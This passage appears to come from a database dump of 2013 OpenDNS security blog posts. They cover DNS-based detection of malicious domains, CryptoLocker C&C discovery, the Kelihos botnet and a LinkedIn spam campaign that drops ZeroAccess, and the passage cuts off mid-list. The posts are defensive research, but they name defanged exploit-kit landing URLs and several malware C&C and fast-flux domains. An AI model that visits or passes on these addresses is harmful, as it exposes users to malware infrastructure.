WiFi—your data could be copied or stolen.\n\n\nBack up your data regularly, and make sure your anti-virus software is always up to date.\n\n\nBe conscientious of what you plug in to your computer. Malware can be spread through infected flash drives, external hard drives, and even smartphones.\n\n\nWatch what you’re sharing on social networks. Criminals can befriend you and easily gain access to a shocking amount of information—where you go to school, where you work, when you’re on vacation—that could help them gain access to more valuable data.\n\n\nOffline, be wary of social engineering, where someone attempts to gain information from you through manipulation. If someone calls or emails you asking for sensitive information, it’s okay to say no. You can always call the company directly to verify credentials before giving out any information.\n\n\nBe sure to monitor your accounts for any suspicious activity. If you see something unfamiliar, it could be a sign that you’ve been compromised.', 'Community', 'https://umbrella.cisco.com/blog/2013/10/08/top-ten-important-cyber-security-tips-users/');

This year, however, the OpenDNS offices have received a clear sign of fall: students!\nJason and Taylor, our interns!\nEven though a short conversation with the Labs team can feel as informative as an hour-long lecture, For the past few weeks USF computer science students Jason Narine and Taylor Wolfram, have been working on a project with the OpenDNS engineering team. As part of their senior year coursework at USF, Jason and Taylor have the opportunity to work on projects with real-world applications. Luckily for us, they thought the OpenDNS project sounded the coolest.\nWhile we can’t reveal all the details just yet, we can say that Jason and Taylor’s project will extend the functionality of Umbrella and have a major impact on OpenDNS customers. According to our student interns, that impact is one of the best things about the project. “I like working on something that someone actually uses,” says Taylor. “The most gratifying thing is to have something out there.”\nIn addition to building cool things, our interns are here to get a feel for what its like to work on an engineering team, so we’ve given them a fair amount of independence to work on their projects. It’s important for them to experience the kind of responsibility that’s difficult to recreate in a classroom.\n“We’re exploring new things that OpenDNS doesn’t do yet,” says Jason. “So if customers like it, it’s because of us. If they don’t like it, it’s also because of us.”\nSounds like a lot of pressure, but they’d better get used to it—both Jason and Taylor plan to stay in the Bay Area and work for tech companies after graduating later this year. And they’re definitely liking the experience so far.\n“Some of the other projects just meet in a cafe to review work,” says Taylor. “So it’s been a really good learning experience to actually get to be in the office.” While they can’t come into the office every day—those little things called “classes” seem to get in the way—Jason and Taylor have gotten involved in the OpenDNS culture when they’re here. They both mention meetings with senior engineers and live demos of new features as highlights of their time here. Jason and Taylor are here for about 10 more weeks, but it will take us a long time to get used to no longer having them around. They brought a fresh new energy into the office, and they’re building fresh new features for our customers.\nThere’s nothing like the buzz of new students walking around the halls at the beginning of a new school year. But because all of OpenDNS can’t go back to school—we brought school back to us. Maybe this is how our college and university customers feel!

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1618, 'ZeroMQ: Helping us Block Malicious Domains in Real Time', 'OpenDNS Security Research', 'October 4, 2013', 'Every day, we process terabytes of data in order to spot malicious domains based on their network features and how they are accessed.\nOur live dataset comes from two major sources: – The log files of queries sent by users to our resolvers – The log files of queries sent by our resolvers to authoritative servers.\nIn this blog post, we will focus on the latter, highlighting how we use it to block suspicious domains immediately after they show up in our log files.\nA not-quite-passive DNS database ———————————-\nEvery time a resolver needs to answer a question that it hasn’t seen before, or that is no longer present in the cache, it must recursively query authoritative DNS servers before eventually being able to forward the final response to a client.\nWe are logging every single packet received by our resolvers from authoritative servers. This lets us keep historical data on all the domain names that we received queries for.\nThis kind of database is often referred to as a “Passive DNS database,” but our system works in a different way, and it’s not quite passive. We are not running sensors: the resolvers themselves are directly logging the responses they receive from authoritative servers.\nSuch a database lets us answer questions like, “What are all the IP addresses that example.com has resolved to in the past 90 days?” and, “What are all the domain names that are using ns1.example.com as an authoritative server?”\nBuilding the database ———————\nRecords received from authoritative servers are highly redundant, because the majority of records have a short TTL even though their content doesn’t actually change much. The edns-clientsubnet extension also triggers a new upstream query for each client subnet, even though many different subnets are actually going to share the same response. Removing duplicate records is thus an essential preliminary step to build our DNS database. This step drastically reduces the amount of data to store: on average, out of 241 log records, we actually only store one.\nWe use a Bloom filter in order to remove duplicate records without having to sort them. Hash functions used to build this Bloom filter are created by using SipHash-2-4 with pseudorandomly-generated keys, and the keys are rotated after each batch of data. Thanks to this trick, we can use very small bitmaps without having to worry too much about false positives: if a name is being reported as present in the set while it shouldn’t, it is very unlikely to happen again after a key rotation. Using a secure pseudorandom function also prevents attackers from intentionally triggering false positives.\nThe output of this deduplication filter is eventually stored as Hadoop HDFS files, and finally into HBase for ad-hoc queries. We sequentially run a dozen Hadoop jobs every day on this data in order to compute different reputation scores for IP addresses and domain names. This eventually lets us find domain names that need to be manually reviewed, or, when combined with the output of other models and third-party services, can be automatically blocked.\nThe need for real time processing ———————————\nRunning algorithms once a day on the data is clearly suboptimal. If nytimes.com DNS records are hijacked, we need to spot this as soon as possible to protect our customers, not the next day. Furthermore, domain names that serve exploits are also typically only in use for a short period of time. We want to block them while they are still active, and as soon as possible, not after the baton has been passed to another domain.\nEnter ZeroMQ ————\nZeroMQ is a popular, battle-tested message transport protocol and networking library, designed for very low and predictable latency, high throughput, and high reliability.\n\nThe ZeroMQ library implements, among other things, the traditional pub/sub pattern: a “producer” generates a stream of data that any number of local or remote clients can simultaneously connect to, in order to receive live updates.\nAfter the deduplication process, and in addition to storing the output into HDFS and Hadoop, we are now streaming this data to a ZeroMQ socket.\nThis brings a lot of benefits: – Any authorized machine can join and leave the feed, anytime. This allows for instant testing and parallel processing without any setup. Need to quickly look for domain names matching a specific pattern? That can be done directly on a researcher’s laptop. – Security: ZeroMQ supports strong encryption and certificate-based authentication out of the box, thanks to libsodium. – Low CPU impact: a single machine can effortlessly consume our stream of preprocessed authoritative log data. – Low latency: the data is immediately available for consumption. – No API required: all it takes is a host name and a port number. Just connect to the socket, and you will start receiving formatted data. The ZeroMQ protocol is widely used, and there are readily available client libraries for more than 40 programming languages, as well as plugins for common tools like Splunk.\nAs soon as a client connects, it gets a live stream of JSON objects that can be processed right away.  {\"name\":\"a60.w22.akamai.net.\",\"owner\":\"w22.akamai.net.\",\"rr\":\"23.59.188.41\",\"server_ip\":\"96.17.144.41\",\"ts\":1380671640,\"ttl\":20,\"type\":\"A\"} {\"name\":\"a60.w22.akamai.net.\",\"owner\":\"w22.akamai.net.\",\"rr\":\"23.59.188.64\",\"server_ip\":\"96.17.144.41\",\"ts\":1380671640,\"ttl\":20,\"type\":\"A\"} {\"name\":\"www.unitedminds.ie.\",\"owner\":\"unitedminds.ie.\",\"rr\":\"81.17.254.44\",\"server_ip\":\"81.17.254.6\",\"ts\":1380671640,\"ttl\":3600,\"type\":\"A\"} {\"name\":\"2-01-2a01-0007.cdx.cedexis.net.\",\"owner\":\"cedexis.net.\",\"rr\":\"ie0101-authconsumer001-1094152544.eu-west-1.elb.amazonaws.com.\",\"server_ip\":\"69.28.180.4\",\"ts\":1380671640,\"ttl\":20,\"type\":\"CNAME\"} {\"name\":\"2-01-2a01-000a.cdx.cedexis.net.\",\"owner\":\"cedexis.net.\",\"rr\":\"us0801asw013.tango.me.\",\"server_ip\":\"69.28.180.4\",\"ts\":1380671640,\"ttl\":20,\"type\":\"CNAME\"} {\"name\":\"www.facebook-fun.com.\",\"owner\":\"facebook-fun.com.\",\"rr\":\"facebook-fun.com.\",\"server_ip\":\"216.69.185.7\",\"ts\":1380671640,\"ttl\":3600,\"type\":\"CNAME\"} {\"name\":\"scs.retail.fidelity.com.\",\"owner\":\"retail.fidelity.com.\",\"rr\":\"155.199.36.26\",\"server_ip\":\"192.223.177.53\",\"ts\":1380671640,\"ttl\":60,\"type\":\"A\"} {\"name\":\"a3.dscg10.akamai.net.\",\"owner\":\"dscg10.akamai.net.\",\"rr\":\"204.2.145.186\",\"server_ip\":\"96.17.144.40\",\"ts\":1380671640,\"ttl\":20,\"type\":\"A\"} {\"name\":\"hiphotos.wshifen.com.\",\"owner\":\"wshifen.com.\",\"rr\":\"185.10.107.162\",\"server_ip\":\"180.76.8.100\",\"ts\":1380671640,\"ttl\":300,\"type\":\"A\"}\n\nBuilding streams out of streams ——————————-\nA simple use case of this stream is keeping track of new domain names, or rather domain names that we didn’t see traffic for before, or that didn’t resolve to any IP address until now. In order to do so, we once again use Bloom filters that keep track of unique domain names. To provide a sliding window, we simply use a ring buffer of seven Bloom filters, that we are shifting once the most recent filter gets more than one day old, or holds more than 25 million entries. The output of this consumer is another ZeroMQ stream, that we can use to inspect new web sites as soon as they are discovered.\nIn addition to tracking new domain names, we simultaneously run another consumer tracking new (domain name, IP) tuples.\nOur IP reputation systems ————————-\nEvery day, we run three Hadoop jobs to assign reputation scores to IP addresses. The first is a bayesian average of the number of known malicious domains found on a given IP address. The second is the secure rank score. The third is based on the amount of “disposable” domains that an IP address has been hosting compared to the amount of stable domains seen on the same IP. (We’ll discuss this score in more detail in an upcoming post.)\nWe use these IP reputation systems to build lists of IP addresses that have been serving a lot of domain names, all of them being known as controlled by cybercriminals.\nPutting the pieces together —————————\n\nSince we already have a stream of new (domain name, IP) tuples, new domain names resolving to one of the highly suspicious IP addresses can be immediately blocked. While the ZeroMQ library itself is fast and provides latency guarantees, the actual producer and consumer code also needs to be equally efficient to process the data at the same rate as it is received.\nThis was a good opportunity to try Rust, a modern programming language by Mozilla Research aiming at being a safe replacement for C++. Minor changes to the ZeroMQ bindings had to be done in order to make them compatible with the latest Rust version. But overall, our experience with Rust has been absolutely amazing.\nWe contributed our changes to the ZeroMQ bindings and open sourced our Bloom Filter implementation on Github.\nTowards a more real time architecture ———————————————\nWhen it comes to blocking malware, every second counts. A speedy resolution is the only way to limit the number of compromised machines, so models based on stream processing are insanely useful.\nWe are not going to get rid of our pink friend any time soon,but he just got a new buddy.', 'Big Data;Open Source;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/10/04/zeromq-helping-us-block-malicious-domains/');

They lead a technical discussion on the challenges facing current solutions in the security industry, the importance of the cloud in Big Data, and what makes Big Data interesting. They also shared insights on how Umbrella by OpenDNS uses Big Data to provide better security.\n\nIf you were unable to join us—or just want a refresher—I’ve listed the 5 most important takeaways from the conversation:\nAttackers are aware of the Big Data trend, and are exploiting it for their own benefit.\nAs anyone in the industry will tell you, defenders are locked in a seemingly endless game of cat and mouse with attackers. For every new innovation introduced by security services, bad actors adopt new techniques to elude detection. Big Data can provide insight into these activities that wasn’t possible before, but it’s important to remember that there is no silver bullet.\nIntelligence is a large part of the Big Data conversation.\nIt’s easy to forget the analysis aspect of Intelligence—you need to understand what you’re getting from Big Data, and how it applies to your organization, strategically. Having predictive protection in place frees up time your team can use to analyze resources, and why someone might try to access them. With Big Data, you can understand a threat and decide on the best response for your organization with a level of clarity that wasn’t available before.\nBig Data is at the core of Umbrella Security.\nThe basic tenet of the Umbrella Security Suite is simple: it’s designed to protect your users and data on any device, anywhere, anytime. We do this by taking the huge amount of data generated by our 50 million daily users and running it through the Security Graph, applying data mining and algorithmic classification techniques to identify malicious activity. If you try to access a site we know to host malware, we respond with a block page—the goal being to prevent user access to the site and protect your data. Utilizing Big Data analysis, we can see a complete threat picture and stay one step ahead of any bad actors that might be targeting your network.\nUmbrella detects and prevents malware from ever reaching your network.\nThe time it takes to detect a malicious site depends on several variables—how it was created, how it works, etc. The problem with current security technology is that a copy of the attack is needed in order to protect against it, and the time it takes to update defenses and mitigate a threat is already too long. With Umbrella’s predictive security, there’s no waiting. In fact, we block domains before they can become malicious. Our security is built on algorithmic classification and machine learning enabling us to predict attacks before they happen and protect against them before they can cause damage for our customers.\nUmbrella can identify malicious domains, even if no data exists about that domain.\nEven though Umbrella by OpenDNS is built on the power of Big Data analysis, it’s still effective at blocking threats from domains about which we have no data. It’s exceedingly rare that there is no known information about a given domain; however, if that is the case, evidence of the attack can still be found. Often there will be small pieces of data left by an attacker; these can include the observing the attacker set up a domain and test it, analyzing the Patient 0 of the attack, or observing how an attacker registers or hosts the domain. If no such data exists, other systems like reputation management or behavioral analysis tools help to stack our defenses against attacks with little known information, keeping users protected.\nWatch the full 40-minute webcast on demand here.', 'Umbrella;Webcasts', 'https://umbrella.cisco.com/blog/2013/10/02/5-key-takeaways-big-data-webcast/');

When dealing with cases of few infections and thus mostly low traffic volume (but not necessarily less impact!), making correlations and revealing patterns with little contextual information becomes both tricky and critical. Using the recent revival of the ransomware Cryptolocker, which victimized a few OpenDNS customers, we present a case study of a method that we call the Ripple Effect.\nThe ransomware spread typically through email attachments. Once the malware is downloaded and executed on the victim’s system, it first establishes connections with its command and control (CnC) servers, from which it retrieves an encryption key . It then begins encrypting data files on the system, across all connected drives and mapped network shares.\nThe victim sees a popped window asking for one-time payments at $300 to regain their access to the encrypted data files. Under no circumstances should one ever pay the fee. However, without the decryption key, there is no way to recover the encrypted files except from backups.\nThe Emsisoft blogpost has an in-depth analysis.

In order to contain the threat, we need to predict or detect these domains in time to prevent the malware from phoning home. After all,\n \n\nContainment is the new prevention.\n— Dan Hubbard (@dhubbard858) September 22, 2013\n\n \n \nIf we knew the DGA (domain generation algorithm) used by the malware, determining the generated domains would be effortless. But investigating the malware code to reveal these algorithms and their many variations is a time and resource intensive process that stands in the way of timely response. Can we find a way to predict what domains the malware will contact without knowledge of the algorithm?\nWe sent in a simple query “ip:184.164.136.134” in the beloved cuckoo sandbox system malwr.com. Malwr provides a good collection of cryptolocker samples here for us to advance our study.\n\n\nMalwr executes malware samples in a sandbox environment, reporting both static and dynamic analysis including files accessed, registry keys modified, and network hosts contacted by the malware. Now we have a set of CnC domains that Cryptolocker samples have contacted—a good start. \nNow we forego the arduous task of uncovering the DGA algorithm, and we take a rather different approach to detection. We think it’s a pretty neat process, so we ‘ve actually given it a name—the Ripple Effect. \nGiven a seed set of known domains, we start searching the unknown by expanding the co-occurring domains with the known ones. For two domains to co-occur means that a statistically significant number of clients have requested both domains consecutively in a small time window. Please find more detail in this technical blog on domain co-occurrence. \n\n K = set(known domains)  # seed domains\n S = K\n N = K # the first ripple\n\n WHILE N is not empty:\n       for n in N:\n             Sn = set(domains co-occurred with n)\n             S = S.union(Sn)\n\n       N = S.difference(K)\n       K = S# so now you see why I call it the Ripple Effect. =]\n\nWith the mighty power of Security Graph visualization platform, we can show a nice animation of the ripple effect starting off from this domain uwelwphpjsemxsn.info (seed domain).  \n\n \n \nSeveral domains were expanded by clicking this seed domain to show co-occurring domains, and we continue to expand them for more co-occurring domains. The process continues until we no longer find new domains. \n\nThis screenshot below shows the Ripple Effect  expanding the co-occurrence domains from the set of seed domains that we started with.\n \nHere’s a sample of some of the domains we found:\n\nuwelwphpjsemxsn[.]infoarjddblgbsumi[.]bizdanvawrrcgrwo[.]comobcmcbmdspopn[.]orgfrjpjcapmnvdo[.]ruewyublfwlgcgf[.]netcfdbrgwybyxam[.]co[.]uk\n\nTo find the full list of domains we discovered using the Ripple Effect method today, click here.  \nSecurity threats spreading via emails have a long history. They are not seen as frequently as a decade ago, but they aren’t dying any time soon. A bit of social engineering can make a victim out of all but the most vigilant, and the sheer volume of potential targets means even a low rate of success makes a campaign worthwhile for the perpetrators. Because some attachments will inevitably be opened, cutting off communication back out to CnC servers is an effective method of containment, but finding that domain generation algorithm takes too long to prevent damage. We developed the Ripple Effect to protect our users from malware like Cryptolocker even without uncovering the DGA.\nOf course users themselves stand at the front line of defense against social engineering attacks. The Ripple Effect can find many of the domains that the malware attempts to contact, but it can’t be 100% effective. Always practice your best judgement in opening email attachments, especially from unfamiliar sources. Important data files should be always properly backed up. A good security scheme requires multiple layers of defense with no reliance on a single system. Desktop Antivirus, Email gateway scanning, and OpenDNS offer a good trio of protections against threats like this.', 'Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/09/25/ripple-effect/');

What better a place to host this special event than our great city of San Francisco? The conference drew crowds from academia, industry, and the governing bodies of the Internet; there were presentations from RSA, PayPal, Microsoft, UC Berkeley, CMU, IID, StubHub, ICANN, and the .org, .pl, .jp, .co and .uk registries, among others. OpenDNS was at the scene with two presentations: our CTO, Dan Hubbard, presented on Monday Sep 16th on “Achieving Zen with a new Security Venn” and I presented a research case study on “Real time Monitoring of fast flux botnets using DNS” on Wednesday Sep 18th.\n\nThe Talk\nIn my presentation, I discussed a 7-month study of the Kelihos fast flux botnet from a DNS perspective. This involved real-time monitoring and detection of Kelihos domains using both our recursive and authoritative DNS traffic. Some of the highlights of the talk were the monitoring methodology used: it first carefully defines a profile of domains to monitor, then watches the emergence of similar domains in real time. I also discussed the Kelihos domains’ TLD distribution, botnet country distribution, statistics on the daily lifecycle of the botnet, daily detected domains, lifetime of domains and hosting IPs, and malware payload delivered. I also described the valuable collaboration with the research group MalwareMustDie, which is paramount to swiftly take these domains down right after they are blacklisted in our systems to protect our customers. For more details, you can consult the slides here. Also, the final version of the submitted paper will be available soon in the conference proceedings. Below, you can also see a world map with a sample of the botnet’s infected hosts prepared by my colleague Thibault (check his recent blog).\n\nThe Conference\nI attended several good talks. A recurring theme was the need to streamline the collaboration between industry, law enforcement, ICANN, registries, registrars and regional CERTs and ISPs. This is important to facilitate and speed up the takedown of malicious domains, and hosting infrastructures on one hand, and the prosecution of the criminals behind these operations on the other hand. Cybercrime increases in sophistication at a staggering speed, and shows no sign of slowing down, so if the laws and policies don’t follow suit, then we are losing the battle.\n\nA notable talk under this theme was “Put the F@ckers in Jail, part Deux! Direct-to-Prosecutor Referrals” by StubHub. I also found the panel discussion “ccTLD Abuse Management Protocols and Practices” quite insightful which was moderated by ICANN, and featured CERT/NASK Poland (.pl registry), PIR (.org registry), Japan Registry Services (.jp registry), and Nominet (.uk registry).\nFor instance, CERT/NASK described how their new team of lawyers was able to use two principles to push local law enforcement into action:\n“The general principles of civil law, where one is responsible for any harm caused by his actions or negligence.” NASK was compelled to take action against malicious domains or risk being held liable for their activities. \n“To hold claims against NASK, a domain owner would have to prove his losses, therefore criminal charges against the owner would stall the civil dispute.” The owners of malicious domains could only take legal action against NASK by demonstrating legitimate losses—which would be impossible to do until the criminal case was completed.\nNASK was able to take over and sinkhole 82 domains of the Virut botnet in early 2013 and several hundred more in subsequent operations. Details are described here and information on other operations can be found here.\nProtecting Our Customers: a Real Time Detection Framework of Malicious Domains\nThe real time monitoring/detection system I described in the talk has been used on a larger scale to daily detect domains involved in various malicious campaigns. For example, I tailored the system to monitor fast flux domains of different families (domains that share same IP pool, TTL value, etc), so in addition to the daily stream of Kelihos domains recognizable by their TTL=0, the system has monitored other FF domains with TTL=150, 300, 1440, used for other malicious purposes. For example, TTL=1440 is typical of certain spam, scam, casino, and pharmacy domains.\nThis more generalized real time monitoring framework detects everyday, hundreds to a few thousands of domains serving various Exploit kits, or used as CnCs for trojans such as Sality, and Caphaw; ransomware CnCs such as CryptoLocker, Reveton, Urausy, and browser-based ransomware domains, etc.\nThe accuracy of such profiling of domains stems from the fact that, domains, and IPs are often reused, recycled, rented, and borrowed among malicious campaigns and criminal organizations.\nThese detected domains are confirmed malicious as they generally combine bad IP reputation, recent registration, a surge in traffic volume, similar name patterns, and 0-day age (as they are detected in real time in our traffic). Below is an example of an Exploit kit serving domain detected a few hours earlier by our real time system. More examples of such discovered Exploit kit domains that we blocked to protect our users then shared with the security community can be found here.\n\nBecause of the worldwide visibility of OpenDNS into recursive and authoritative DNS, our real time system constitutes an early detection layer for our customers, and should be part of a defense-in-depth approach to security, to face the barrage of increasingly sophisticated attacks.', 'Security Community;Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/09/24/real-time-monitoring-kelihos-fast-flux-botnet-case-study-presented-apwg-ecrime-2013/');

As many people know, a graph can be used to represent a widerange of problems or data structures. This time in this article, we will focus on the visualization of a specific case: a Random Forest.\nWhat are Random Forests?\nTechnically speaking, “Random Forests” aren’t exactly a data structure but a machine learning framework to build a list of decision trees. So before we canactually answer this question, let’s give a short overview of decision trees. Consider the following example:\n\nThis model helps us decide and classify various types of animals given a variety of criteria. In this case, the criteria are fur, feathers, scales and gills. We can enter any input animal and be able to determine the animal’s family even if we have never seen that animal before.\nOf course, the animal classification is now pretty much static, and, in the absence of hybrid or newly born species, it’s safe to say that it will rarely change. Famous biologists and naturalists like Charles Darwin have spent decades building this model by observation, so it is now generally accepted in this state.\nIn modern classification problems like Big Data security, owning such a precise and accurate decision tree would be a real gold mine. In our case, it would allow a 0% error in all automatic decisions and a 100% accuracy on all the predictions we make on our unknown incoming data. In practice, however, the perfect decision tree almost never exists, so we have to deal with error thresholds.\nFor a good analogy of DNS filtering, imagine be a naturalist trying to decide which animals are dangerous to humans when around 600,000 animals try to approach each second. They evolve extremely fast, they come from everywhere, some are harmless, some are ferocious, some are infected, some are infected without knowing it, and the most dangerous ones know your decision patterns and mutate to bypass the radars. So how can we build a decision tree for such dynamic wildlife?\nIt’s simple: we gather data, we classify it manually, and we propose criteria.\nEntering the Random Forest\nFrom the known data and criteria, the generation algorithm will create a list of decision trees that match our training set. So in fact, we don’t use only one but several decision trees and we ask all of their answers to reach a general decision.\nIn other words, it’s like taking several pictures of all the animals that you encounter, extracting key characteristics (claws, fangs, size, etc.), andbuilding a correlation among those who did or didn’t attack you. Next time you meet an unknown creature you can follow your decision tree and if it turned out to be incorrect, you remember it and recreate a decision pattern from your new (unfortunate) experience.,\nToday we’re giving you a couple of pictures to look at. They show one of our own random forests taken a couple weeks ago. The white nodes are the leaves, the purple ones are the interior nodes. The label of the nodes describe the criteria, the error and the samples used in the decision step.\n\nFor example: bibikun.ru\nBibikun.ru has been detected as a malicious domain by our classifiers; In fact, it is one of those fast flux domains we discovered. For more information on fast flux domains, check out this presentation recently given by Dhia on the topic.\nLet’s take a look at a small part of our web interface for this particular domain:\n\nThis is data that we gathered and built based on our resolver logs. For example the first scores (ASN score, Prefix Score, RIP score) give us a global reputation score on its ASs, Prefixes and IPs. They will be the key values used in our decision tree creation.\nTracing the path of the decision inside the tree can help us understand many details. Here is what our JSON API response looks like when we request the decision path for this particular domain:\n{\"label\":\"bad\",\"confidence\":0.5,\"score\":-100.0,\"z\":0.0,\"path\":[{\"vid\":0,\"fid\":24,\"sp\":-0.8061,\"z\":0.5,\"fname\":\"rip_score\"},{\"vid\":1,\"fid\":24,\"sp\":-3.7866,\"z\":0.9204902892407564,\"fname\":\"rip_score\"},{\"vid\":2,\"fid\":24,\"sp\":-9.149,\"z\":0.9815885700931116,\"fname\":\"rip_score\"},{\"vid\":3,\"fid\":22,\"sp\":0.2215,\"z\":0.9930534371394087,\"fname\":\"pagerank\"},{\"vid\":4,\"fid\":23,\"sp\":-4.1412,\"z\":0.9936817098976564,\"fname\":\"prefix_score\"},{\"vid\":5,\"fid\":22,\"sp\":0.0016,\"z\":0.9978593207864578,\"fname\":\"pagerank\"},{\"vid\":6,\"fid\":20,\"sp\":47.7773,\"z\":0.9985154708204116,\"fname\":\"popularity\"},{\"vid\":7,\"fid\":20,\"sp\":16.6064,\"z\":0.9986403806934059,\"fname\":\"popularity\"},{\"vid\":8,\"fid\":4,\"sp\":0.2502,\"z\":0.9989628214910697,\"fname\":\"div_rips\"},{\"vid\":14,\"fid\":18,\"sp\":-0.1001,\"z\":0.999116889601953,\"fname\":\"asn_score\"},{\"vid\":15,\"fid\":23,\"sp\":-5.9561,\"z\":0.9993391077955239,\"fname\":\"prefix_score\"},{\"vid\":16,\"fid\":17,\"sp\":1.5833,\"z\":0.9994826997738812,\"fname\":\"name_split_mean\"},{\"vid\":20,\"fid\":1,\"sp\":86317.5,\"z\":0.9995031547005305,\"fname\":\"ttls_median\"},...{\"vid\":31,\"fid\":8,\"sp\":0.75,\"z\":0.9999068294046399,\"fname\":\"rips_stability\"},{\"vid\":32,\"fid\":86,\"sp\":0.5,\"z\":0.9996971073754354,\"fname\":\"796834E7A2\"},{\"vid\":33,\"fid\":23,\"sp\":-25.3884,\"z\":0.9997703964487984,\"fname\":\"prefix_score\"}],\"name\":\"bibikun.ru\"}\nIndeed, no less than 25 levels are traversed in order to receive a proper response. As you can see, the score of this domain is -100, so for us there is no doubt of its maliciousness.\nWe can see that the first steps of the traversal are “rip_score,” “pagerank,” “prefix_score,” etc.). As you can imagine, they are criteria based on our reputation scores.Since the tree creation heuristic includes some randomness, the logic behind the order of the sequence isn’t necessarily obvious, but the ‘vid’ field (or Vertex ID) gives an interesting way to visualize it.\nThis field points to the current node in the decision tree; starting from there it is now fairly simple to trace a path in the 3D visualization tool and observe the result.\n\nNice, isn’t it ?\nThis big decision forest is one way to represent experience applied on a knowledge database. It is important for us to take a deep look at it and understand where the bottlenecks are. As the wildlife grows, we want to make sure less and less users get bitten everyday.', 'Big Data;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/09/19/inside-random-forest-journey-wildlife-classification/');

We rely on our users to provide feedback on our products, help us categorize domains, and tell us how we’re doing as a company. The three groups that largely power these objectives are our Domain Tagging, Security, and PhishTank communities.\nLike all good things, however, community is best with moderation—for the web is dark and full of terrors (and trolls). The responsibility for keeping our enthusiastic members in line falls to a lone sheriff: Vinny LaRiza, our one and only Community Moderator.\nLast week, I sat down with Vinny to get the inside track on his role at the company and why community is so important to us.\nAs the Community Mod, Vinny does a lot more than swing the banhammer. In addition to patrolling the groups, he serves as support for people experiencing website blocks due to malicious activity, and helps the research team identify malware false positives.\nAt first, Vinny was intimidated by working with the researchers who make up our Security Labs. “They’re all really smart—bonafide geniuses. And each of them is interesting and cool in a unique way.” He went on to say just how fortunate he feels to be a part of such an amazing team. “It’s exciting to come to work every day. I definitely enjoy working with them—and especially with Dan Hubbard, our CTO.”\nVinny is an important member of the team himself, serving as liaison between OpenDNS and the public. Part of his work consists of “checking in on the communities in terms of activity, and making sure they’re on point. But more importantly, staying in constant contact with group members, and providing a point of human contact—almost like a lifeline to the company.”\n“People in our communities are really cool, very smart, and reasonable,” he continues, “I want to empower them to not only help us out by tagging domains, but also to enjoy doing it. We consider all of our users to be very important, and this is just one more way to give them a platform to make themselves heard.”\nVinny has a clear goal, but the varying natures of the three communities can make moderation a balancing act. “There’s not a lot of danger in categorizing sites within Domain Tagging or PhishTank”, he says, “ but the security community can be dangerous, and requires more hands-on interaction from us. They’re dealing with malware and other things that can mess your system up —definitely handle with care.”\nDespite these differences, Vinny’s moderation style can carry over from one group to another. “People don’t react well to negative attitudes, so I try to stay positive. One thing to remember is that—excluding the security community—we have members with different skill levels, so it’s important to communicate with them clearly.”\n“All of our users, no matter who they are, should feel like they can talk to us. Everyone is important —we genuinely care, and we want to help them out if they have a question or a problem. That’s why I’m here, to help.”\nAlthough members of the security community must apply to be admitted, the Domain Tagging and PhishTank groups are open for anyone to participate. This inclusive community is a great way for non-techies to actively participate in security. “Domain Taggers come from a lot of different backgrounds,” Vinny says, “they can be teachers, librarians, retirees—the process can be pretty interesting. You’ll learn a lot about different sites.”\nWhat users may lack in technical acumen, they certainly make up for with enthusiasm: community members vote on 20,000 domains every week, and submit another 7,000 to the database.  “It’s really a great concept. Users are giving back and taking control of their own protection,” Vinny says.\nParticipation in the communities is on a voluntary basis, but Vinny says those who frequently engage with the group will get the most out of it. In addition, the top contributors in each community are rewarded with tokens of appreciation, like OpenDNS swag or gadgets.\n“I get to know the top contributors very well mainly because they’re also the best communicators: they ask me about anything. But I want other users to know that they shouldn’t feel shy about sending me an email. I want them to have the best experience possible in our communities, so if they have a question, they shouldn’t hesitate to reach out.”\nJoining the OpenDNS Communities is a simple task—just apply and let us know why you’d like to join. If you’re interested in the Security Community, you’ll have to demonstrate your technical skills, but otherwise, the only qualification you need is enthusiasm!\nFor more information on how to join our Domain Tagging, PhishTank, or Security Community, click here, or you can email Vinny directly at vinny@opendns.com.', 'Community;People & Culture', 'https://umbrella.cisco.com/blog/2013/09/19/meet-team-vinny-lariza-community-moderator/');

The past spam campaigns combined Blackhole Exploit with Cridex or Zeus malware as it was reported in [1] and well discussed in [2].\nLast Monday, we witnessed the emergence of a new LinkedIn spam mail campaign as we see below (Thanks to @peterkruse for reporting it)\n\nExploitation chain\nIn this particular case, if you click the “Accept” button, you are redirected to hxxp://champagnefuif.klammehand.be/modules/wp-enter.php?xV72H17G11U7AT2AA, a compromised WordPress page (see urlquery report  [3] and wepawet [4]) and from there you land on hxxp://languagespreferably.biz/closest/i9jfuhioejskveohnuojfir.php, a Blackhole Exploit landing page (see urlquery report [5]). The exploit inspects your machine’s plugins for any vulnerabilities and, if successful, places a file named calc.exe on your machine, which is a ZeroAccess dropper. You just became part of the ZeroAccess botnet! The binary matches this VirusTotal signature.\nIn the figure below, we can see the spike in traffic on Monday Sep 2nd, when the spam campaign started.\n\nLooking at the behavioral section of the VirusTotal report of the dropped ZeroAccess sample, we see these DNS requests:\nj.maxmind.com (108.168.255.244)\nwww.google.com (173.194.45.83)\nThe bot looks up google.com to test for internet connectivity, and resolves maxmind.com so that it can call the geoip service with this HTTP request:\nURL: http://j.maxmind.com/app/geoip.js\nTYPE: GET\nUSER AGENT: None\nThe GeoIP callbacks to maxmind are a typical Sirefef/ZeroAccess trademark, because the malware needs to find out what country it is located in. ZeroAccess is known to be used to download other malware on an infected machine; once the malware detects where it is, it knows where to connect  next so it can download further payload (mostly Medfos malware).\nIn this campaign, ZeroAccess is dropped by a Blackhole version dubbed ”closest” which was first well described by MalwareMustDie in [6]. Similar spam campaigns such as those targeting Facebook and redirecting to Blackhole were observed to drop Trojan Zbot/Pony (Credential Stealer), MedFos (downloader) and Zero Access, as reported in [7].\nZeroAccess callback IPs\nOnce installed, ZeroAccess tries to connect to a peer-to-peer network to download plugin files to enrich the payload functionality. In the behavioral section of the VirusTotal report, we can see a list of supernode callback IPs the ZeroAccess sample tries to contact on UDP port 16464. Running the sample locally in a VM also produces a larger list of supernode callback IPs. Supernodes are the internet-facing nodes of the botnet that distribute files and IP lists to other nodes in the botnet. On the other hand, normal botnet nodes might be sitting behind NAT and can only communicate through the supernodes with the outside CnCs. We checked the larger list of 89 callback IPs, and we found out that a few of these IPs have hosted 17 Kelihos Fast flux domains (or subdomains) in the past (check our past blogs on Kelihos [8], [9], [10]), that we list here: abeeu.bobpawa.com, aqa.renuncam.nl, cx3r5.nigucgu.com, 